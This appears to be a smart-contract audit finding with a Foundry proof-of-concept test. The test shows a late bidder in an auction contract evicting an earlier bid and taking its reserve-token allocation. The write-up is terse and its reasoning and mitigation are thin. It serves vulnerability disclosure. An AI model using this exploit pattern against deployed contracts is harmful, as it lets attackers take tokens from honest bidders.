# The attacker can get reserve tokens just before the auction ends.

### Summary
Say 
maxBids = 3
bob1 bids (50,  slot), bob2 bids (30, slot), bob3 bids(20  slot)
just before the auction ends, if the attacker bids(100,2*slot), bob1 is removed and the attacker bids as (50,slot) same as bob1.
And the attacker gets the high amount of reserve token even if  bids just before end.
### Root Cause
bid is removed, and the attacker's bid is added.

### Internal Pre-conditions


### External Pre-conditions

### Attack Path
Just before the auction ends, the attacker has to bid.

### Impact
The attacker can secure the highest amount of reserve tokens in the auction by bidding just before it ends.
### PoC

```solidity
  function testAttackerManipulatesAuction() public {
    uint256 slot = 5000 / 3; // maxBids is 3, totalBuyCouponAmount is 5000.

    // Bob1 places the first bid.
    vm.startPrank(bob1);
    usdc.mint(bob1, slot);
    usdc.approve(address(auction), slot);
    auction.bid(50, slot); // Bid: 50 reserve, slot coupons
    vm.stopPrank();

    // Bob2 places the second bid.
    vm.startPrank(bob2);
    usdc.mint(bob2, slot);
    usdc.approve(address(auction), slot);
    auction.bid(30, slot); // Bid: 30 reserve, slot coupons
    vm.stopPrank();

    // Bob3 places the third bid.
    vm.startPrank(bob3);
    usdc.mint(bob3, slot);
    usdc.approve(address(auction), slot);
    auction.bid(20, slot); // Bid: 20 reserve, slot coupons
    vm.stopPrank();

    // Just before the auction ends, the attacker places a large bid to manipulate the list.
    vm.warp(auction.endTime() - 1 hours);
    vm.startPrank(attacker);
    usdc.mint(attacker, 2 * slot);
    usdc.approve(address(auction), 2 * slot);
    auction.bid(100, 2 * slot); // Bid: 100 reserve, 2 * slot coupons
    vm.stopPrank();

    // At this point, Bob1's bid (50, slot) is removed due to prioritization logic.

    // The attacker places another bid with the same ratio as Bob1.
    vm.startPrank(attacker);
    usdc.mint(attacker, slot);
    usdc.approve(address(auction), slot);
    auction.bid(50, slot); // Bid: 50 reserve, slot coupons (same as Bob1)
    vm.stopPrank();

    // The auction ends.
    vm.warp(auction.endTime());
    vm.prank(pool);
    auction.endAuction();

    // Verify the attacker's bid replaced Bob1 and achieved the same terms.
    uint256 lastBidIndex = auction.lastBidIndex();
    (address bidAddress, uint256 reserveAmount, uint256 couponAmount,,,) = auction.bids(lastBidIndex);

    assertEq(bidAddress, address(attacker)); // The attacker successfully replaced Bob1.
    assertEq(reserveAmount, 50);             // Reserve amount is the same as Bob1's.
    assertEq(couponAmount, slot);            // Coupon amount is the same as Bob1's.

    vm.stopPrank();
}
```
### Mitigation

There has to be a validation.
